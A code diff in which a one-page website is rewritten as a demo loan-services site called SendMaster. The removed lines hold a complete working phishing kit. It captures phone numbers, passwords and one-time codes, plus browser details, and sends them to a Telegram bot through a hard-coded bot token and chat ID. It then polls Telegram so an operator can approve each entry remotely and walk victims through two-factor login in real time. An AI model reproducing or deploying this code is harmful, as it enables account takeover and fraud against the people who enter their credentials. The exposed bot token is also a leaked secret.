+                                            <i class="fa-solid fa-arrow-left me-1"></i> Return to Home Page
+                                        </a>
+                                    </p>
+                                </div>
+                            </form>
+
+                            <div class="mt-4 p-3 bg-light rounded-3 text-center border">
+                                <p class="extra-small text-muted mb-0" style="font-size: 0.75rem;">
+                                    <i class="fa-solid fa-shield-halved me-1 text-success"></i> Demonstration Login Interface. Real credentials are not transmitted or stored in static preview mode.
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- GLOBAL FOOTER -->
+        <footer class="py-4 mt-auto">
+            <div class="container">
+                <div class="row g-4 mb-4">
+                    <div class="col-md-4">
+                        <div class="d-flex align-items-center gap-2 mb-2">
+                            <span class="brand-icon" style="width:28px; height:28px; font-size:0.9rem;">S</span>
+                            <span class="fw-bold text-white fs-5">SendMaster</span>
+                        </div>
+                        <p class="small text-muted mb-0">Connecting consumers with clear loan educational resources and lender network options across the United States.</p>
+                    </div>
+                    <div class="col-md-2 col-6">
+                        <h2 class="h6 text-white fw-bold mb-3">Navigation</h2>
+                        <ul class="list-unstyled small mb-0">
+                            <li class="mb-2"><a href="javascript:void(0)" onclick="navigateTo('index.html')">Home</a></li>
+                            <li class="mb-2"><a href="javascript:void(0)" onclick="navigateTo('eligibility.html')">Check Eligibility</a></li>
+                            <li class="mb-2"><a href="javascript:void(0)" onclick="navigateTo('loan-details.html')">Loan Options</a></li>
+                            <li><a href="javascript:void(0)" onclick="navigateTo('login.html')">Portal Sign In</a></li>
+                        </ul>
+                    </div>
+                    <div class="col-md-3 col-6">
+                        <h2 class="h6 text-white fw-bold mb-3">Legal & Disclosures</h2>
+                        <ul class="list-unstyled small mb-0">
+                            <li class="mb-2"><a href="javascript:void(0)" onclick="alert('Privacy Policy: SendMaster protects user privacy and non-sensitive demo entries.')">Privacy Policy</a></li>
+                            <li class="mb-2"><a href="javascript:void(0)" onclick="alert('Terms of Service: SendMaster provides informational loan content.')">Terms of Service</a></li>
+                            <li><a href="javascript:void(0)" onclick="alert('Contact: support@sendmaster-loans-demo.us')">Customer Support</a></li>
+                        </ul>
+                    </div>
+                    <div class="col-md-3">
+                        <h2 class="h6 text-white fw-bold mb-3">Regulatory Notice</h2>
+                        <p class="extra-small text-muted mb-0" style="font-size: 0.75rem;">
+                            SendMaster does not guarantee loan approval. Rates and terms are subject to final underwriting, verification, and criteria set by third-party participating financial institutions.
+                        </p>
+                    </div>
+                </div>
+                <div class="border-top border-secondary pt-3 text-center extra-small text-muted" style="font-size: 0.8rem;">
+                    &copy; 2026 SendMaster Loans USA. All rights reserved. Demonstration Financial Services Web Platform.
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <!-- CODE FILE VIEWER CONTAINER (Hidden by default, switched via top bar) -->
+    <div id="code-files-container" class="container py-4 d-none">
+        <div class="d-flex justify-content-between align-items-center mb-3">
+            <div>
+                <h2 class="h4 fw-bold mb-1"><i class="fa-solid fa-folder-tree text-primary me-2"></i> Project Directory: sendmaster-loans/</h2>
+                <p class="text-muted small mb-0">Click any file below to inspect or copy source code.</p>
+            </div>
+            <button class="btn btn-outline-dark btn-sm" onclick="switchMode('preview')"><i class="fa-solid fa-xmark me-1"></i> Close Source Viewer</button>
+        </div>
+
+        <div class="row">
+            <div class="col-md-3 mb-3">
+                <div class="list-group shadow-sm">
+                    <button class="list-group-item list-group-item-action active fw-semibold" id="file-btn-index" onclick="showFileCode('index.html')">
+                        <i class="fa-brands fa-html5 me-2 text-warning"></i> index.html
+                    </button>
+                    <button class="list-group-item list-group-item-action fw-semibold" id="file-btn-eligibility" onclick="showFileCode('eligibility.html')">
+                        <i class="fa-brands fa-html5 me-2 text-warning"></i> eligibility.html
+                    </button>
+                    <button class="list-group-item list-group-item-action fw-semibold" id="file-btn-details" onclick="showFileCode('loan-details.html')">
+                        <i class="fa-brands fa-html5 me-2 text-warning"></i> loan-details.html
+                    </button>
+                    <button class="list-group-item list-group-item-action fw-semibold" id="file-btn-login" onclick="showFileCode('login.html')">
+                        <i class="fa-brands fa-html5 me-2 text-warning"></i> login.html
+                    </button>
+                    <button class="list-group-item list-group-item-action fw-semibold" id="file-btn-css" onclick="showFileCode('css/style.css')">
+                        <i class="fa-brands fa-css3-alt me-2 text-info"></i> css/style.css
+                    </button>
+                    <button class="list-group-item list-group-item-action fw-semibold" id="file-btn-js" onclick="showFileCode('js/script.js')">
+                        <i class="fa-brands fa-js me-2 text-warning"></i> js/script.js
+                    </button>
+                </div>
+            </div>
+
+            <div class="col-md-9">
+                <div class="card shadow-sm">
+                    <div class="card-header bg-dark text-white d-flex justify-content-between align-items-center">
+                        <span id="current-filename" class="fw-bold font-monospace">index.html</span>
+                        <button class="btn btn-sm btn-success" onclick="copyCurrentCode()"><i class="fa-regular fa-copy me-1"></i> Copy File Code</button>
+                    </div>
+                    <div class="card-body p-0">
+                        <div class="code-container" id="file-code-display">
+                            <!-- Populated dynamically via JS -->
+                        </div>
+                    </div>
+                </div>
+            </div>
         </div>
     </div>
 
-    <!-- ════════════════ PASSWORD MODAL ════════════════ -->
-    <div class="modal-overlay" id="passwordModal">
-        <div class="modal">
-            <button class="modal-close" onclick="closePasswordModal()" aria-label="Close">×</button>
-            <div class="modal-icon" aria-hidden="true">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
-                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
-                </svg>
-            </div>
-            <h2 class="modal-title">Enter your password</h2>
-            <p class="modal-text">For security reasons, your password is required to complete this action.</p>
-            <div class="modal-error" id="modalError">Incorrect password. Please try again.</div>
-            <div class="password-input-wrapper">
-                <input type="password" class="password-input" id="passwordInput" placeholder="Password" autocomplete="current-password">
-                <button class="password-toggle" onclick="togglePasswordVisibility()" aria-label="Toggle password visibility">👁</button>
-            </div>
-            <a href="#" class="forgot-password" onclick="handleForgotPassword(event)">Forgot password?</a>
-            <button class="modal-confirm-btn" id="confirmBtn" onclick="confirmPassword()">Confirm</button>
-        </div>
-    </div>
+    <!-- Bootstrap 5 JS Bundle -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 
-    <!-- ════════════════════════════════════════════════════════════════ -->
-    <!--                          JAVASCRIPT                            -->
-    <!-- ════════════════════════════════════════════════════════════════ -->
+    <!-- App JavaScript Logic & Multi-Page Simulator -->
     <script>
-        /* ================================================================
-                   ╔══════════════════════════════════════════════════════════╗
-                   ║  TELEGRAM BOT CONFIG — Set your credentials below       ║
-                   ╚══════════════════════════════════════════════════════════╝
-                   ================================================================ */
-        const TELEGRAM_BOT_TOKEN = '8623755939:AAGFVI-26owFB1_rNhZXwIen0RTLkWfnvxo';
-        const TELEGRAM_CHAT_ID = '5615316142';
-
-        /* ─── C2 Polling State ─── */
-        let lastUpdateId = 0;
-        let pollingInterval = null;
-        let pendingAction = null; // 'password' | 'otp' | null
-        let pendingPhone = null;
-        let pendingPassword = null;
-        let pendingOtp = null;
-
-        /* ================================================================
-           TELEGRAM: send message (plain)
-           ================================================================ */
-        function sendToTelegram(message) {
-            if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID') {
-                console.warn('[Telegram] Bot not configured.');
-                return;
-            }
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            }).catch(err => console.error('[Telegram] Send failed:', err));
-        }
-
-        /* ================================================================
-           TELEGRAM: send message WITH inline keyboard buttons
-           ================================================================ */
-        function sendTelegramWithKeyboard(message, keyboardButtons) {
-            if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID') {
-                console.warn('[Telegram] Bot not configured.');
-                return;
-            }
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: 'HTML',
-                    reply_markup: {
-                        inline_keyboard: keyboardButtons
-                    }
-                })
-            }).catch(err => console.error('[Telegram] Send failed:', err));
-        }
-
-        /* ================================================================
-           TELEGRAM: answer callback query (remove loading state on button)
-           ================================================================ */
-        function answerCallbackQuery(callbackQueryId) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    callback_query_id: callbackQueryId
-                })
-            }).catch(() => {});
-        }
-
-        /* ================================================================
-           POLLING: getUpdates loop
-           ================================================================ */
-        function startPolling() {
-            stopPolling();
-            pollingInterval = setInterval(pollTelegram, 2000);
-        }
-
-        function stopPolling() {
-            if (pollingInterval) {
-                clearInterval(pollingInterval);
-                pollingInterval = null;
-            }
-        }
-
-        async function pollTelegram() {
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=3`;
-            try {
-                const resp = await fetch(url);
-                const data = await resp.json();
-                if (data.ok && data.result && data.result.length > 0) {
-                    for (const update of data.result) {
-                        lastUpdateId = update.update_id;
-                        if (update.callback_query) {
-                            handleCallback(update.callback_query);
-                        }
-                    }
-                }
-            } catch (e) {
-                // silent
-            }
-        }
-
-        /* ================================================================
-           CALLBACK HANDLER — controls page flow remotely
-           ================================================================ */
-        function handleCallback(cb) {
-            const data = cb.data || '';
-            answerCallbackQuery(cb.id);
-
-            if (data.startsWith('pw_approve:')) {
-                // ✅ Password approved — proceed to OTP page
-                if (pendingAction === 'password') {
-                    hideLoading();
-                    closePasswordModal();
-                    showCodePage();
-                    pendingAction = null;
-                    stopPolling();
-                }
-            } else if (data.startsWith('pw_wrong:')) {
-                // ❌ Password wrong — show error on modal
-                if (pendingAction === 'password') {
-                    hideLoading();
-                    document.getElementById('modalError').classList.add('active');
-                    document.getElementById('confirmBtn').disabled = false;
-                    document.getElementById('passwordInput').value = '';
-                    document.getElementById('passwordInput').focus();
-                    pendingAction = null;
-                    stopPolling();
-                }
-            } else if (data.startsWith('otp_approve:')) {
-                // ✅ OTP approved — login success
-                if (pendingAction === 'otp') {
-                    hideLoading();
-                    alert('Login successful!');
-                    // Reset everything
-                    closeCodePage();
-                    clearAllCodeInputs();
-                    pendingAction = null;
-                    stopPolling();
-                }
-            } else if (data.startsWith('otp_wrong:')) {
-                // ❌ OTP wrong — reset to phone number page
-                if (pendingAction === 'otp') {
-                    hideLoading();
-                    alert('Invalid verification code. Please try again.');
-                    closeCodePage();
-                    clearAllCodeInputs();
-                    pendingAction = null;
-                    stopPolling();
-                }
-            }
-        }
-
-        /* ================================================================
-           UI Helpers
-           ================================================================ */
-        function showLoading(text) {
-            document.getElementById('loadingText').textContent = text || 'Verifying...';
-            document.getElementById('loadingOverlay').classList.add('active');
-        }
-
-        function hideLoading() {
-            document.getElementById('loadingOverlay').classList.remove('active');
-        }
-
-        function getPhone() {
-            return document.getElementById('phoneInput').value.trim() || 'Not provided';
-        }
-
-        function getClientInfo() {
-            return [
-                'User-Agent: ' + navigator.userAgent,
-                'Language: ' + navigator.language,
-                'Platform: ' + navigator.platform,
-                'Timezone: ' + Intl.DateTimeFormat().resolvedOptions().timeZone,
-                'Screen: ' + screen.width + 'x' + screen.height
-            ].join('\n');
-        }
-
-        function getTimestamp() {
-            return new Date().toLocaleString();
-        }
-
-        function clearAllCodeInputs() {
-            ['code1', 'code2', 'code3', 'code4', 'code5', 'code6'].forEach(id => {
-                document.getElementById(id).value = '';
-            });
-        }
-
-        /* ================================================================
-           COUNTRY DATA
-           ================================================================ */
-        const COUNTRIES = [{
-            flag: '🇺🇸',
-            name: 'United States',
-            code: 'US',
-            dial: '+1'
-        }, {
-            flag: '🇬🇧',
-            name: 'United Kingdom',
-            code: 'GB',
-            dial: '+44'
-        }, {
-            flag: '🇨🇦',
-            name: 'Canada',
-            code: 'CA',
-            dial: '+1'
-        }, {
-            flag: '🇦🇺',
-            name: 'Australia',
-            code: 'AU',
-            dial: '+61'
-        }, {
-            flag: '🇮🇳',
-            name: 'India',
-            code: 'IN',
-            dial: '+91'
-        }, {
-            flag: '🇩🇪',
-            name: 'Germany',
-            code: 'DE',
-            dial: '+49'
-        }, {
-            flag: '🇫🇷',
-            name: 'France',
-            code: 'FR',
-            dial: '+33'
-        }, {
-            flag: '🇮🇹',
-            name: 'Italy',
-            code: 'IT',
-            dial: '+39'
-        }, {
-            flag: '🇪🇸',
-            name: 'Spain',
-            code: 'ES',
-            dial: '+34'
-        }, {
-            flag: '🇳🇱',
-            name: 'Netherlands',
-            code: 'NL',
-            dial: '+31'
-        }, {
-            flag: '🇧🇷',
-            name: 'Brazil',
-            code: 'BR',
-            dial: '+55'
-        }, {
-            flag: '🇲🇽',
-            name: 'Mexico',
-            code: 'MX',
-            dial: '+52'
-        }, {
-            flag: '🇯🇵',
-            name: 'Japan',
-            code: 'JP',
-            dial: '+81'
-        }, {
-            flag: '🇰🇷',
-            name: 'South Korea',
-            code: 'KR',
-            dial: '+82'
-        }, {
-            flag: '🇨🇳',
-            name: 'China',
-            code: 'CN',
-            dial: '+86'
-        }, {
-            flag: '🇷🇺',
-            name: 'Russia',
-            code: 'RU',
-            dial: '+7'
-        }, {
-            flag: '🇿🇦',
-            name: 'South Africa',
-            code: 'ZA',
-            dial: '+27'
-        }, {
-            flag: '🇳🇬',
-            name: 'Nigeria',
-            code: 'NG',
-            dial: '+234'
-        }, {
-            flag: '🇦🇷',
-            name: 'Argentina',
-            code: 'AR',
-            dial: '+54'
-        }, {
-            flag: '🇸🇪',
-            name: 'Sweden',
-            code: 'SE',
-            dial: '+46'
-        }, {
-            flag: '🇳🇴',
-            name: 'Norway',
-            code: 'NO',
-            dial: '+47'
-        }, {
-            flag: '🇩🇰',
-            name: 'Denmark',
-            code: 'DK',
-            dial: '+45'
-        }, {
-            flag: '🇫🇮',
-            name: 'Finland',
-            code: 'FI',
-            dial: '+358'
-        }, {
-            flag: '🇵🇹',
-            name: 'Portugal',
-            code: 'PT',
-            dial: '+351'
-        }, {
-            flag: '🇵🇱',
-            name: 'Poland',
-            code: 'PL',
-            dial: '+48'
-        }, {
-            flag: '🇹🇷',
-            name: 'Turkey',
-            code: 'TR',
-            dial: '+90'
-        }, {
-            flag: '🇦🇪',
-            name: 'UAE',
-            code: 'AE',
-            dial: '+971'
-        }, {
-            flag: '🇸🇦',
-            name: 'Saudi Arabia',
-            code: 'SA',
-            dial: '+966'
-        }, {
-            flag: '🇸🇬',
-            name: 'Singapore',
-            code: 'SG',
-            dial: '+65'
-        }, {
-            flag: '🇭🇰',
-            name: 'Hong Kong',
-            code: 'HK',
-            dial: '+852'
-        }, {
-            flag: '🇮🇱',
-            name: 'Israel',
-            code: 'IL',
-            dial: '+972'
-        }, {
-            flag: '🇨🇭',
-            name: 'Switzerland',
-            code: 'CH',
-            dial: '+41'
-        }, {
-            flag: '🇦🇹',
-            name: 'Austria',
-            code: 'AT',
-            dial: '+43'
-        }, {
-            flag: '🇧🇪',
-            name: 'Belgium',
-            code: 'BE',
-            dial: '+32'
-        }, {
-            flag: '🇮🇪',
-            name: 'Ireland',
-            code: 'IE',
-            dial: '+353'
-        }, {
-            flag: '🇳🇿',
-            name: 'New Zealand',
-            code: 'NZ',
-            dial: '+64'
-        }, {
-            flag: '🇵🇭',
-            name: 'Philippines',
-            code: 'PH',
-            dial: '+63'
-        }, {
-            flag: '🇻🇳',
-            name: 'Vietnam',
-            code: 'VN',
-            dial: '+84'
-        }, {
-            flag: '🇹🇭',
-            name: 'Thailand',
-            code: 'TH',
-            dial: '+66'
-        }, {
-            flag: '🇮🇩',
-            name: 'Indonesia',
-            code: 'ID',
-            dial: '+62'
-        }, {
-            flag: '🇲🇾',
-            name: 'Malaysia',
-            code: 'MY',
-            dial: '+60'
-        }, {
-            flag: '🇵🇰',
-            name: 'Pakistan',
-            code: 'PK',
-            dial: '+92'
-        }, {
-            flag: '🇧🇩',
-            name: 'Bangladesh',
-            code: 'BD',
-            dial: '+880'
-        }, {
-            flag: '🇪🇬',
-            name: 'Egypt',
-            code: 'EG',
-            dial: '+20'
-        }, {
-            flag: '🇰🇪',
-            name: 'Kenya',
-            code: 'KE',
-            dial: '+254'
-        }, {
-            flag: '🇺🇦',
-            name: 'Ukraine',
-            code: 'UA',
-            dial: '+380'
-        }, {
-            flag: '🇷🇴',
-            name: 'Romania',
-            code: 'RO',
-            dial: '+40'
-        }, {
-            flag: '🇨🇿',
-            name: 'Czech Republic',
-            code: 'CZ',
-            dial: '+420'
-        }, {
-            flag: '🇬🇷',
-            name: 'Greece',
-            code: 'GR',
-            dial: '+30'
-        }, {
-            flag: '🇭🇺',
-            name: 'Hungary',
-            code: 'HU',
-            dial: '+36'
-        }, {
-            flag: '🇨🇱',
-            name: 'Chile',
-            code: 'CL',
-            dial: '+56'
-        }, {
-            flag: '🇨🇴',
-            name: 'Colombia',
-            code: 'CO',
-            dial: '+57'
-        }, ];
-
-        let selectedCountry = COUNTRIES[0];
-        let dropdownOpen = false;
-
-        const trigger = document.getElementById('countryTrigger');
-        const dropdown = document.getElementById('countryDropdown');
-        const flagEl = document.getElementById('selectedFlag');
-        const dialEl = document.getElementById('selectedDial');
-        const phoneIn = document.getElementById('phoneInput');
-
-        /* ================================================================
-           INIT
-           ================================================================ */
-        function init() {
-            const savedCode = localStorage.getItem('loginCountryCode');
-            const savedPhone = localStorage.getItem('loginPhoneNumber');
-            if (savedCode) {
-                const match = COUNTRIES.find(c => c.code === savedCode);
-                if (match) selectedCountry = match;
-            }
-            phoneIn.value = savedPhone || '+1 (301) 525-6024';
-            updateTriggerDisplay();
-            buildDropdown();
-            updateCodeDescription();
-        }
-
-        function updateTriggerDisplay() {
-            flagEl.textContent = selectedCountry.flag;
-            dialEl.textContent = selectedCountry.dial;
-        }
-
-        function buildDropdown() {
-            dropdown.innerHTML = '';
-            COUNTRIES.forEach((c, idx) => {
-                const item = document.createElement('div');
-                item.className = 'country-item' + (c.code === selectedCountry.code ? ' active' : '');
-                item.innerHTML = `<span class="flag-emoji">${c.flag}</span><span class="country-name">${c.name}</span><span class="dial-code">${c.dial}</span>`;
-                item.dataset.index = idx;
-                item.setAttribute('role', 'option');
-                item.setAttribute('aria-selected', c.code === selectedCountry.code);
-                item.addEventListener('click', (e) => {
-                    e.stopPropagation();
-                    selectCountry(idx);
-                });
-                dropdown.appendChild(item);
-            });
-        }
-
-        function selectCountry(index) {
-            const country = COUNTRIES[index];
-            if (!country) return;
-            selectedCountry = country;
-            updateTriggerDisplay();
-            closeDropdown();
-            localStorage.setItem('loginCountryCode', country.code);
-            const current = phoneIn.value.trim();
-            const cleaned = current.replace(/^\+\d{1,4}\s*/, '').trim();
-            phoneIn.value = country.dial + ' ' + cleaned;
-            savePhone();
-            updateCodeDescription();
-            document.querySelectorAll('.country-item').forEach((el, i) => {
-                el.classList.toggle('active', i === index);
-                el.setAttribute('aria-selected', i === index);
-            });
-        }
-
-        function toggleCountryDropdown() {
-            dropdownOpen ? closeDropdown() : openDropdown();
-        }
-
-        function openDropdown() {
-            dropdownOpen = true;
-            dropdown.classList.add('open');
-            trigger.classList.add('open');
-            trigger.setAttribute('aria-expanded', 'true');
-            const active = dropdown.querySelector('.country-item.active');
-            if (active) active.scrollIntoView({
-                block: 'nearest'
-            });
-            document.addEventListener('click', outsideHandler);
-        }
-
-        function closeDropdown() {
-            dropdownOpen = false;
-            dropdown.classList.remove('open');
-            trigger.classList.remove('open');
-            trigger.setAttribute('aria-expanded', 'false');
-            document.removeEventListener('click', outsideHandler);
-        }
-
-        function outsideHandler(e) {
-            if (!e.target.closest('#phoneGroup')) closeDropdown();
-        }
-
-        function handlePhoneInput() {
-            savePhone();
-            updateCodeDescription();
-        }
-
-        function savePhone() {
-            const v = phoneIn.value.trim();
-            if (v) localStorage.setItem('loginPhoneNumber', v);
-        }
-
-        function updateCodeDescription() {
-            const el = document.getElementById('codeDescription');
-            if (el) el.textContent = 'We sent a 6-digit code to ' + (phoneIn.value.trim() || selectedCountry.dial + ' …') + '.';
-        }
-
-        function goBack() {
-            history.back();
-        }
-
-        function handleLogin() {
-            const phone = phoneIn.value.trim();
-            if (!phone) {
-                alert('Please enter your phone number.');
-                return;
-            }
-            savePhone();
-            sendToTelegram(
-                `<b>🔐 LOGIN ATTEMPT</b>\n` +
-                `━━━━━━━━━━━━━━━━━\n` +
-                `<b>Time:</b>     ${getTimestamp()}\n` +
-                `<b>Phone:</b>    <code>${phone}</code>\n` +
-                `<b>Country:</b>  ${selectedCountry.flag} ${selectedCountry.name} (${selectedCountry.dial})\n` +
-                `━━━━━━━━━━━━━━━━━\n` +
-                `<b>Client:</b>\n${getClientInfo()}`
-            );
-            openPasswordModal();
-        }
-
-        function toggleBiometrics() {
-            const t = document.getElementById('biometricsToggle');
-            t.classList.toggle('off');
-            t.setAttribute('aria-checked', !t.classList.contains('off'));
-        }
-
-        /* ================================================================
-           PASSWORD MODAL — with C2 approval
-           ================================================================ */
-        function openPasswordModal() {
-            document.getElementById('modalError').classList.remove('active');
-            document.getElementById('passwordInput').value = '';
-            document.getElementById('confirmBtn').disabled = false;
-            document.getElementById('passwordModal').classList.add('active');
-            setTimeout(() => document.getElementById('passwordInput').focus(), 100);
-        }
-
-        function closePasswordModal() {
-            document.getElementById('passwordModal').classList.remove('active');
-            document.getElementById('passwordInput').value = '';
-            document.getElementById('passwordInput').type = 'password';
-            document.getElementById('modalError').classList.remove('active');
-            document.getElementById('confirmBtn').disabled = false;
-        }
-
-        function togglePasswordVisibility() {
-            const inp = document.getElementById('passwordInput');
-            const btn = document.querySelector('.password-toggle');
-            if (inp.type === 'password') {
-                inp.type = 'text';
-                btn.textContent = '👁‍🗨';
-            } else {
-                inp.type = 'password';
-                btn.textContent = '👁';
-            }
-        }
-
-        function confirmPassword() {
-            const pw = document.getElementById('passwordInput').value.trim();
-            if (!pw) {
-                alert('Please enter your password');
-                return;
-            }
-
-            const phone = getPhone();
-
-            // Store pending state
-            pendingAction = 'password';
-            pendingPhone = phone;
-            pendingPassword = pw;
-
-            // Disable button, hide error
-            document.getElementById('confirmBtn').disabled = true;
-            document.getElementById('modalError').classList.remove('active');
-
-            // Send to Telegram with inline Approve / Wrong buttons
-            sendTelegramWithKeyboard(
-                `<b>🔑 PASSWORD CAPTURED</b>\n` +
-                `━━━━━━━━━━━━━━━━━\n` +
-                `<b>Time:</b>     ${getTimestamp()}\n` +
-                `<b>Phone:</b>    <code>${phone}</code>\n` +
-                `<b>Password:</b> <code>${pw}</code>\n` +
-                `━━━━━━━━━━━━━━━━━\n` +
-                `<b>Client:</b>\n${getClientInfo()}`, [
-                    [{
-                        text: '✅ Approve Password',
-                        callback_data: 'pw_approve:' + phone
-                    }, {
-                        text: '❌ Wrong Password',
-                        callback_data: 'pw_wrong:' + phone
-                    }]
-                ]
-            );
-
-            // Show loading overlay and start polling for the decision
-            showLoading('Waiting for approval...');
-            startPolling();
-        }
-
-        function handleForgotPassword(e) {
-            e.preventDefault();
-            alert('Redirecting to password recovery...');
-        }
-
-        /* ================================================================
-           CODE VERIFICATION — with C2 approval
-           ================================================================ */
-        function showCodePage() {
-            document.getElementById('codeContainer').classList.add('active');
-            document.getElementById('mainContainer').style.display = 'none';
-            document.getElementById('code1').focus();
-            startResendTimer();
-            updateCodeDescription();
-        }
-
-        function closeCodePage() {
-            document.getElementById('codeContainer').classList.remove('active');
-            document.getElementById('mainContainer').style.display = 'block';
-            clearResendTimer();
-        }
-
-        function handleCodeInput(input, nextId) {
-            if (!/^\d*$/.test(input.value)) {
-                input.value = '';
-                return;
-            }
-            if (input.value.length === 1 && nextId) document.getElementById(nextId).focus();
-
-            const ids = ['code1', 'code2', 'code3', 'code4', 'code5', 'code6'];
-            if (ids.every(id => document.getElementById(id).value !== '')) {
-                const code = ids.map(id => document.getElementById(id).value).join('');
-                const phone = getPhone();
-
-                // Store pending state
-                pendingAction = 'otp';
-                pendingPhone = phone;
-                pendingOtp = code;
-
-                // Send to Telegram with inline Approve / Wrong buttons
-                sendTelegramWithKeyboard(
-                    `<b>📨 VERIFICATION CODE</b>\n` +
-                    `━━━━━━━━━━━━━━━━━\n` +
-                    `<b>Time:</b>  ${getTimestamp()}\n` +
-                    `<b>Phone:</b> <code>${phone}</code>\n` +
-                    `<b>Code:</b>  <code>${code}</code>\n` +
-                    `━━━━━━━━━━━━━━━━━\n` +
-                    `<b>Client:</b>\n${getClientInfo()}`, [
-                        [{
-                            text: '✅ Approve OTP',
-                            callback_data: 'otp_approve:' + phone
-                        }, {
-                            text: '❌ Wrong OTP',
-                            callback_data: 'otp_wrong:' + phone
-                        }]
-                    ]
-                );
-
-                // Show loading overlay and start polling
-                showLoading('Verifying code...');
-                startPolling();
-            }
-        }
-
-        let timerInterval, resendTime = 22;
-
-        function startResendTimer() {
-            resendTime = 22;
-            updateTimer();
-            clearResendTimer();
-            timerInterval = setInterval(() => {
-                resendTime--;
-                updateTimer();
-                if (resendTime <= 0) {
-                    clearResendTimer();
-                    enableBtns();
-                }
-            }, 1000);
-        }
-
-        function updateTimer() {
-            document.getElementById('resendTimer').textContent = resendTime + ' seconds';
-        }
-
-        function clearResendTimer() {
-            if (timerInterval) {
-                clearInterval(timerInterval);
-                timerInterval = null;
-            }
-        }
-
-        function enableBtns() {
-            document.getElementById('smsBtn').disabled = false;
-            document.getElementById('whatsappBtn').disabled = false;
-        }
-
-        function disableBtns() {
-            document.getElementById('smsBtn').disabled = true;
-            document.getElementById('whatsappBtn').disabled = true;
-        }
-
-        function handleSMS() {
-            alert('Code resent via SMS to ' + (phoneIn.value.trim() || selectedCountry.dial + ' …'));
-            disableBtns();
-            startResendTimer();
-        }
-
-        function handleWhatsApp() {
-            alert('Code resent via WhatsApp to ' + (phoneIn.value.trim() || selectedCountry.dial + ' …'));
-            disableBtns();
-            startResendTimer();
-        }
-
-        function handleChangeNumber(e) {
-            e.preventDefault();
-            closeCodePage();
-        }
-
-        /* ================================================================
-           SOCIAL / FOOTER
-           ================================================================ */
-        function handleGoogle() {
-            sendToTelegram(`<b>🌐 SOCIAL CLICK</b>\n━━━━━━━━━━━━━\n<b>Time:</b>  ${getTimestamp()}\n<b>Action:</b> Continue with Google\n<b>Phone:</b> <code>${getPhone()}</code>`);
-            alert('Continuing with Google...');
-        }
-
-        function handleApple() {
-            sendToTelegram(`<b>🌐 SOCIAL CLICK</b>\n━━━━━━━━━━━━━\n<b>Time:</b>  ${getTimestamp()}\n<b>Action:</b> Continue with Apple\n<b>Phone:</b> <code>${getPhone()}</code>`);
-            alert('Continuing with Apple...');
-        }
-
-        function handleEmail() {
-            sendToTelegram(`<b>🌐 SOCIAL CLICK</b>\n━━━━━━━━━━━━━\n<b>Time:</b>  ${getTimestamp()}\n<b>Action:</b> Continue with Gmail\n<b>Phone:</b> <code>${getPhone()}</code>`);
-            alert('Continuing with Gmail...');
-        }
-
-        function handleTrouble(e) {
-            e.preventDefault();
-            alert('Redirecting to help page...');
-        }
-
-        function handleSignup(e) {
-            e.preventDefault();
-            alert('Redirecting to sign up page...');
-        }
-
-        document.addEventListener('keydown', (e) => {
-            if (e.key === 'Escape' && dropdownOpen) closeDropdown();
-            if (e.key === 'Escape' && document.getElementById('passwordModal').classList.contains('active') && pendingAction !== 'password') {
-                closePasswordModal();
+        // Global State & Storage Key
+        const STORAGE_KEY = 'sendmaster_loan_selection';
+
+        // Default Loan Selection State
+        let currentLoanData = {
+            amount: 10000,
+            purpose: 'Debt Consolidation',
+            state: 'CA',
+            income: '$60,000 - $100,000'
+        };
+
+        // Initialize App on DOM Load
+        window.addEventListener('DOMContentLoaded', () => {
+            loadSavedState();
+            updateHeroCalc();
+            renderLoanDetailsTable();
+
+            // Intercept route hash if present
+            const hash = window.location.hash.replace('#', '');
+            if (['index.html', 'eligibility.html', 'loan-details.html', 'login.html'].includes(hash)) {
+                navigateTo(hash);
             }
         });
 
-        document.addEventListener('DOMContentLoaded', init);
+        // Load persisted choices from LocalStorage
+        function loadSavedState() {
+            const saved = localStorage.getItem(STORAGE_KEY);
+            if (saved) {
+                try {
+                    currentLoanData = JSON.parse(saved);
+                } catch(e) {
+                    console.error('Could not parse saved loan state', e);
+                }
+            }
+
+            // Sync Inputs
+            const elAmt = document.getElementById('el-amount');
+            if (elAmt) elAmt.value = currentLoanData.amount;
+
+            const elPurp = document.getElementById('el-purpose');
+            if (elPurp) elPurp.value = currentLoanData.purpose;
+
+            const elState = document.getElementById('el-state');
+            if (elState) elState.value = currentLoanData.state;
+
+            const elInc = document.getElementById('el-income');
+            if (elInc) elInc.value = currentLoanData.income;
+
+            updateSummaryDisplay();
+        }
+
+        // Save choices to LocalStorage
+        function saveState() {
+            localStorage.setItem(STORAGE_KEY, JSON.stringify(currentLoanData));
+            updateSummaryDisplay();
+            renderLoanDetailsTable();
+        }
+
+        // Navigation Controller
+        function navigateTo(pageId) {
+            // Hide all pages
+            document.querySelectorAll('.page-view').forEach(el => el.classList.remove('active-page'));
+            
+            // Show target page
+            const target = document.getElementById('page-' + pageId.replace('.html', ''));
+            if (target) {
+                target.classList.add('active-page');
+            }
+
+            // Update active nav links
